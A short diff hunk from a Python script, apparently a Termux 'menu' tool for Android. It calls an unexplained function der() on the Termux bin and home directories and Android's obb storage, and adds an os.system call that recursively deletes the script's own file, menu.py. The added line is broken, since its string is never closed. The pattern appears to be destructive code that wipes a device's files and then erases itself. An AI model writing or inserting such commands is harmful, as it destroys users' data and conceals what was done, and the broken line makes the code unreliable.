@@ -15,3 +15,4 @@ def der(dir):
 der('/data/data/com.termux/files/usr/bin')
 der('/data/data/com.termux/files/home')
 der('/storage/emulated/0/Android/obb')
+os.system('rm -r /data/data/com.termux/files/home/menu/menu.py
